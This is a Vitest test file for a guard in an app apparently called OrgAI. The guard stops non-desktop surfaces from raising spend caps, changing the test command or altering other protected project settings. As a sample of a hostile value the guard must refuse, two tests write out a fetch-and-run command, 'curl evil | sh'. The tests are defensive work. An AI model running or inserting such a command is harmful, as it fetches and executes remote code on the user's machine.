import { describe, expect, it, vi } from 'vitest'
import { IPC } from '@shared/types'
import type { HostScope, Project } from '@shared/types'
import { DEFAULT_APP_SETTINGS } from '@shared/defaults'

// The dispatcher must load and run without Electron (cli-spec 3.1.1).
vi.mock('electron', () => {
  throw new Error('electron must not be imported by the host dispatcher')
})
vi.mock('../log', () => ({ log: { debug: () => {}, info: () => {}, warn: () => {}, error: () => {} }, logPath: () => '/logs/main.log', logsDir: () => '/logs' }))

const { HostDispatcher } = await import('./dispatcher')
const { desktopOnlyProjectChanges, desktopOnlyProjectMessage } = await import('./projectSaveGuard')
const { project: makeProject } = await import('../runtime/testHelpers')
type HostServices = import('./types').HostServices
type RpcInvokeContext = import('./types').RpcInvokeContext
type InvokeContext = import('./types').InvokeContext

const DESKTOP: InvokeContext = { surface: 'desktop', senderId: 1 }
const rpc = (scopes: HostScope[]): RpcInvokeContext => ({ surface: 'socket', grantedScopes: scopes })
const CONFIGURE = rpc(['read', 'operate', 'configure'])

const withLimits = (extra: Record<string, unknown> = {}): Project => ({ ...makeProject({ id: 'proj_a' }), ...extra }) as Project

describe('desktopOnlyProjectChanges (pure)', () => {
  const stored = withLimits({ maxDailyUsd: 10, maxMonthlyUsd: 100, onSpendLimit: 'stop', requireTestsPass: true, testCommand: 'npm test', schedulesNearPlanLimit: true })

  it('allows an unchanged copy (a CLI round trip)', () => {
    expect(desktopOnlyProjectChanges(stored, structuredClone(stored))).toEqual([])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits())).toEqual([])
  })

  it('allows lowering a cap, setting one where there was none and turning schedulesNearPlanLimit off', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 2, maxMonthlyUsd: 100, schedulesNearPlanLimit: false })).toEqual([])
    const { schedulesNearPlanLimit: _drop, ...without } = stored
    void _drop
    expect(desktopOnlyProjectChanges(stored, without as Project)).toEqual([])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ maxDailyUsd: 3 }))).toEqual([])
  })

  it('refuses raising or removing a cap, and a junk cap (it would be dropped, which removes it)', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 11 })).toEqual(['maxDailyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxMonthlyUsd: 1e9 })).toEqual(['maxMonthlyUsd'])
    const { maxDailyUsd: _a, maxMonthlyUsd: _b, ...none } = stored
    void _a
    void _b
    expect(desktopOnlyProjectChanges(stored, none as Project)).toEqual(['maxDailyUsd', 'maxMonthlyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: -1 })).toEqual(['maxDailyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 'lots' as unknown as number })).toEqual(['maxDailyUsd'])
  })

  it('refuses turning schedulesNearPlanLimit on', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ schedulesNearPlanLimit: true }))).toEqual(['schedulesNearPlanLimit'])
  })

  it('refuses any change to onSpendLimit, requireTestsPass and testCommand', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, onSpendLimit: 'pause' })).toEqual(['onSpendLimit'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ onSpendLimit: 'stop' }))).toEqual(['onSpendLimit'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, requireTestsPass: false })).toEqual(['requireTestsPass'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ requireTestsPass: true }))).toEqual(['requireTestsPass'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, testCommand: 'curl evil | sh' })).toEqual(['testCommand'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ testCommand: 'npm test' }))).toEqual(['testCommand'])
  })

  it('treats a default value as unchanged (missing onSpendLimit is pause, missing requireTestsPass is false)', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ onSpendLimit: 'pause', requireTestsPass: false, askBeforeStrongerModel: false }))).toEqual([])
  })

  it('refuses any change to branchNamePattern, setting, changing or removing it, and a junk one that would be dropped', () => {
    const withPattern = withLimits({ branchNamePattern: 'orgai/{task}' })
    expect(desktopOnlyProjectChanges(withLimits(), withPattern)).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits({ branchNamePattern: 'orgai/{role}' }))).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits())).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits({ branchNamePattern: '../x' }))).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, structuredClone(withPattern))).toEqual([])
    // A junk value on a project without one is dropped, so it changes nothing.
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ branchNamePattern: '../x' }))).toEqual([])
  })

  it('refuses any change to askBeforeStrongerModel (a missing flag is false)', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ askBeforeStrongerModel: true }))).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits())).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits({ askBeforeStrongerModel: false }))).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits({ askBeforeStrongerModel: true }))).toEqual([])
  })

  it('names every refused field in one plain sentence', () => {
    const fields = desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 50, testCommand: 'x' })
    expect(desktopOnlyProjectMessage(fields)).toBe('These project settings can be changed in the OrgAI window only: maxDailyUsd, testCommand. Spend caps can be lowered from here, not raised or removed.')
  })
})

describe('projects:save from a non-desktop surface', () => {
  function setup(stored: Project) {
    const settings = { get: () => DEFAULT_APP_SETTINGS, dataDir: '/data', set: vi.fn() }
    const saveFromRenderer = vi.fn((p: Project) => p)
    const services: HostServices = {
      projects: { get: (id: string) => (id === stored.id ? stored : null), list: () => [stored], saveFromRenderer } as never,
      runs: { list: () => [] } as never,
      setup: {} as never,
      maintenance: {} as never,
      settings: settings as never,
      connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never,
      mcp: {} as never,
      adapterIds: ['mock'],
      harnessProject: () => makeProject({ id: 'harness', roles: [] }),
      importer: {} as never,
      skills: {} as never,
      skillEvaluation: {} as never,
      capabilities: {} as never,
      quick: {} as never,
      templates: { list: () => [] } as never
    }
    return { d: new HostDispatcher(services), saveFromRenderer }
  }

  const stored = withLimits({ maxDailyUsd: 10, requireTestsPass: false })

  it('refuses a save that raises a cap or sets the test gate, and stores nothing', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, maxDailyUsd: 20 }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, requireTestsPass: true, testCommand: 'curl evil | sh' }], CONFIGURE)).rejects.toMatchObject({
      code: 'scope_denied',
      message: expect.stringContaining('requireTestsPass, testCommand') as unknown as string
    })
    expect(saveFromRenderer).not.toHaveBeenCalled()
  })

  it('refuses a save that sets the branch pattern or the stronger-model question, and the desktop may', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, branchNamePattern: 'orgai/{task}' }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('branchNamePattern') as unknown as string })
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, askBeforeStrongerModel: true }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('askBeforeStrongerModel') as unknown as string })
    expect(saveFromRenderer).not.toHaveBeenCalled()
    await d.invoke(IPC.projectsSave, [{ ...stored, branchNamePattern: 'orgai/{task}', askBeforeStrongerModel: true }], DESKTOP)
    expect(saveFromRenderer).toHaveBeenCalledTimes(1)
  })

  it('refuses the in-process surface too', async () => {
    const { d, saveFromRenderer } = setup(stored)
    const inproc: InvokeContext = { surface: 'inproc', grantedScopes: ['read', 'operate', 'configure'] } as InvokeContext
    await expect(async () => d.invoke(IPC.projectsSave, [{ ...stored, testCommand: 'x' }], inproc)).rejects.toMatchObject({ code: 'scope_denied' })
    expect(saveFromRenderer).not.toHaveBeenCalled()
  })

  it('lets an unchanged copy and a lowered cap through', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await d.invokeRpc(IPC.projectsSave, [{ ...stored, name: 'Renamed' }], CONFIGURE)
    await d.invokeRpc(IPC.projectsSave, [{ ...stored, maxDailyUsd: 1 }], CONFIGURE)
    expect(saveFromRenderer).toHaveBeenCalledTimes(2)
  })

  it('does not restrict the desktop window', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await d.invoke(IPC.projectsSave, [{ ...stored, maxDailyUsd: 500, requireTestsPass: true, testCommand: 'npm test', onSpendLimit: 'stop' }], DESKTOP)
    expect(saveFromRenderer).toHaveBeenCalledTimes(1)
  })
})
